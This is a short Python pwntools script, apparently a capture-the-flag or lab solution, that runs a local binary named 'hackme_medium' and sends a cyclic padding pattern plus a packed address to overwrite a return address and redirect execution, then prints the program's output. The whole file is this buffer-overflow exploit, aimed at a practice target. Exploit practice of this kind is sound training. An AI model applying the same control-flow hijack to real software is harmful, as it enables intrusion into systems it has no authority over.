from pwn import *

io = process('./hackme_medium')

io.send(cyclic(9) + p64(0x401216))

io.shutdown('out')
print(str(io.readall()))

